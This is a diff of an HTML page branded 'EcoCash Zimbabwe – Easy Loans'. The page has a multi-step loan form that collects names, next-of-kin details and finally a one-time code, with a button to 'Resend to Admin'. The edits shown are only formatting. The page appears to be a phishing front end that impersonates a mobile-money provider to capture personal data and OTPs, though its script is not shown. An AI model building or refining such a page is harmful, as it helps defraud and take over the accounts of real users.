@@ -1,8 +1,10 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>EcoCash Zimbabwe – Easy Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="./style.css">
 </head>
 <body>
@@ -37,7 +39,7 @@
                 <p class="step-sub">Step 1 of 4</p>
                 <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-                
+
                 <div class="field">
                     <label for="s1am">Loan Amount ($25 - $2,500)</label>
                     <input type="range" id="s1am" min="25" max="2500" step="5" value="200" oninput="updateStep1Calc()">
@@ -81,7 +83,7 @@
                 <p class="step-sub">Step 2 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
-                
+
                 <div class="field-row">
                     <div class="field"><label for="s2fi">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
                     <div class="field"><label for="s2la">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
@@ -113,7 +115,7 @@
                 <p class="step-sub">Step 3 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-                
+
                 <div class="field-row">
                     <div class="field"><label for="s3kf">Kin First Name</label><input type="text" id="s3kf" placeholder="Kin's first name" oninput="clearErr('s3Err')"></div>
                     <div class="field"><label for="s3kl">Kin Last Name</label><input type="text" id="s3kl" placeholder="Kin's last name" oninput="clearErr('s3Err')"></div>
@@ -220,7 +222,7 @@
                 <button class="btn-resend" id="resendBtnOtp" onclick="requestResend('otp')">🔄 Resend to Admin</button>
                 <div class="resend-status" id="resendStatusOtp"></div>
 
-                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY &amp; APPROVE LOAN</button>
+                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY & APPROVE LOAN</button>
             </div>
         </div>
     </div>
@@ -281,6 +283,5 @@
     </div>
 
     <script src="./script.js"></script>
-
-
-</body></html>
+</body>
+</html>
